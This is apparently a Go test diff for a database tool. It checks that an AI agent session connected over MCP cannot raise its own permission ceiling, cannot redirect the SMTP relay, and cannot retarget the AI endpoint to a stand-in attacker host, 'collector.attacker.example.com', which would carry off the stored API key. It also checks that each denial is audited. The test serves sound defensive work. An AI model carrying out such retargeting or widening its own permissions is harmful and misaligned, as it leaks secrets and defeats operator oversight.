@@ -473,11 +473,50 @@ func TestMCPCannotRewriteItsOwnCeiling(t *testing.T) {
 	a.NoError(err)
 	defer ctl.Close(ctx)
 
+	workspace, err := ctl.workspaceServiceClient.GetWorkspace(ctx, connect.NewRequest(&v1pb.GetWorkspaceRequest{
+		Name: "workspaces/-",
+	}))
+	a.NoError(err)
+
 	before, err := ctl.settingServiceClient.GetSetting(ctx, connect.NewRequest(&v1pb.GetSettingRequest{
 		Name: "settings/WORKSPACE_PROFILE",
 	}))
 	a.NoError(err)
 	ceilingBefore := before.Msg.GetValue().GetWorkspaceProfile().GetMcpCapability()
+
+	// Seed the two settings the retarget vectors merge into. Without a stored
+	// setting the handler answers NotFound, so an unguarded build would report
+	// 404 rather than the retarget landing — the assertions below would pass
+	// for the wrong reason, and the RED state would prove nothing.
+	const storedSMTPPassword = "stored-smtp-secret"
+	const storedAPIKey = "stored-api-key"
+	_, err = ctl.settingServiceClient.UpdateSetting(ctx, connect.NewRequest(&v1pb.UpdateSettingRequest{
+		Setting: &v1pb.Setting{
+			Name: "settings/EMAIL",
+			Value: &v1pb.SettingValue{Value: &v1pb.SettingValue_Email{Email: &v1pb.EmailSetting{
+				From: "bytebase@example.com",
+				Type: v1pb.EmailSetting_SMTP,
+				Config: &v1pb.EmailSetting_Smtp{Smtp: &v1pb.EmailSetting_SMTPConfig{
+					Host: "smtp.example.com", Port: 587, Username: "bytebase", Password: storedSMTPPassword,
+				}},
+			}}},
+		},
+		UpdateMask:   &fieldmaskpb.FieldMask{Paths: []string{"value.email.from", "value.email.type", "value.email.smtp"}},
+		AllowMissing: true,
+	}))
+	a.NoError(err, "precondition: a stored SMTP config for the retarget to inherit")
+	_, err = ctl.settingServiceClient.UpdateSetting(ctx, connect.NewRequest(&v1pb.UpdateSettingRequest{
+		Setting: &v1pb.Setting{
+			Name: "settings/AI",
+			Value: &v1pb.SettingValue{Value: &v1pb.SettingValue_Ai{Ai: &v1pb.AISetting{
+				Enabled: true, Provider: v1pb.AISetting_OPEN_AI,
+				Endpoint: "https://api.openai.com", ApiKey: storedAPIKey, Model: "gpt-4",
+			}}},
+		},
+		UpdateMask:   &fieldmaskpb.FieldMask{Paths: []string{"value.ai.enabled", "value.ai.provider", "value.ai.endpoint", "value.ai.api_key", "value.ai.model"}},
+		AllowMissing: true,
+	}))
+	a.NoError(err, "precondition: a stored AI key for the retarget to inherit")
 
 	session := openMCPSession(ctx, t, ctl, ctl.authInterceptor.token)
 	defer session.Close()
@@ -501,10 +540,27 @@ func TestMCPCannotRewriteItsOwnCeiling(t *testing.T) {
 		"updateMask": "value.email.smtp",
 	})
 
+	// The third vector, and the one that crosses the tenant boundary in SaaS:
+	// a mask naming only the endpoint keeps the stored API key, and
+	// AIService/Chat then posts to that endpoint with the key in a header. The
+	// stored key there is Bytebase's own platform key, seeded per workspace.
+	retargeted := callAPIOnSession(ctx, t, session, "SettingService/UpdateSetting", map[string]any{
+		"setting": map[string]any{
+			"name":  "settings/AI",
+			"value": map[string]any{"ai": map[string]any{"endpoint": "https://collector.attacker.example.com"}},
+		},
+		"updateMask": "value.ai.endpoint",
+	})
+
 	t.Logf("MCP UpdateSetting{mcp_capability: READ_WRITE} → status=%d error=%q", widened.Status, widened.Error)
 	t.Logf("MCP UpdateSetting{email.smtp → attacker} → status=%d error=%q", redirected.Status, redirected.Error)
+	t.Logf("MCP UpdateSetting{ai.endpoint → attacker} → status=%d error=%q", retargeted.Status, retargeted.Error)
 
-	for name, out := range map[string]mcpCallResult{"ceiling": widened, "smtp relay": redirected} {
+	for name, out := range map[string]mcpCallResult{
+		"ceiling":     widened,
+		"smtp relay":  redirected,
+		"ai endpoint": retargeted,
+	} {
 		a.Equal(http.StatusForbidden, out.Status, "the %s write must be refused before dispatch", name)
 		a.Contains(out.Error, "not available to MCP sessions", "the %s write must be refused by the gate", name)
 		a.Contains(out.Error, "the switch meant to contain it",
@@ -517,6 +573,33 @@ func TestMCPCannotRewriteItsOwnCeiling(t *testing.T) {
 	a.NoError(err)
 	a.Equal(ceilingBefore, after.Msg.GetValue().GetWorkspaceProfile().GetMcpCapability(),
 		"the session must not have moved the ceiling that governs it")
+
+	// The destinations are still ours. Reads blank the secrets themselves, so
+	// the host and endpoint are what there is to check — and they are the whole
+	// vector: the stored secret travels to whatever address is recorded here.
+	email, err := ctl.settingServiceClient.GetSetting(ctx, connect.NewRequest(&v1pb.GetSettingRequest{
+		Name: "settings/EMAIL",
+	}))
+	a.NoError(err)
+	a.Equal("smtp.example.com", email.Msg.GetValue().GetEmail().GetSmtp().GetHost(),
+		"the mail relay that carries password resets must not have moved")
+	ai, err := ctl.settingServiceClient.GetSetting(ctx, connect.NewRequest(&v1pb.GetSettingRequest{
+		Name: "settings/AI",
+	}))
+	a.NoError(err)
+	a.Equal("https://api.openai.com", ai.Msg.GetValue().GetAi().GetEndpoint(),
+		"the endpoint the stored API key is sent to must not have moved")
+
+	// UpdateSetting is audited and is NOT one of the reset-flow methods carved
+	// out of workspace-parent resolution, so unlike those its denials do reach
+	// the operator's audit page. Three denied attempts, three rows.
+	rows := deniedMCPRows(ctx, t, ctl, workspace.Msg.Name, "/bytebase.v1.SettingService/UpdateSetting")
+	a.Len(rows, 3, "each denied settings write must be on the audit page")
+	for _, row := range rows {
+		a.Equal(int32(connect.CodePermissionDenied), row.Status.GetCode())
+		a.NotEmpty(row.McpDelegation.GetCorrelationId(),
+			"the denial must be correlatable back to the agent session")
+	}
 
 	// The console keeps working: the gate is on the internal MCP chain only.
 	// An explicit value rather than an echo of ceilingBefore, which the fixture
